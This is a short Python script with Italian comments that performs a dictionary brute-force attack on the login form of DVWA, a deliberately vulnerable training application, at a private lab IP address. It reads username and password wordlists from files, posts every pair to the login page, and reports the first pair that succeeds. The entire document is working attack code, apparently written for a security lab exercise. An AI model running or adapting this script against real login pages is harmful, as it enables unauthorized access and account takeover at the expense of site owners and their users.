import requests

# URL del sito da attaccare
url = "http://192.168.50.101/dvwa/login.php"

# Ottieni la lista degli username da un file specificato dall'utente
user_file = input("Inserisci il percorso per il file con gli username: ")
with open(user_file, "r") as fd:
    users = fd.readlines()

# Ottieni la lista delle password da un file specificato dall'utente
password_file = input("Inserisci il percorso del file con le password: ")
with open(password_file, "r") as fd:
    passwords = fd.readlines()

# Variabile flag che diventa True quando sono trovati username e password validi
done = False

print("Attaccando " + url + "\n")

# Ciclo attraverso gli username
for user in users:
    user = user.rstrip()

    # Ciclo attraverso le password
    for password in passwords:
        if not done:
            password = password.rstrip()

            # Creazione del payload con username, password e il pulsante di login
            payload = {
                "username": user,
                "password": password,
                "Login": "Login"
            }

            # Invio della richiesta POST al sito con il payload
            response = requests.post(url, data=payload)

            # Verifica se il login ha avuto successo
            if response.url.endswith("index.php"):
                print("Successo!\nUser: " + user + "\nPassword: " + password)
                done = True
                break
            else:
                print("Fallito: " + user + " - " + password)
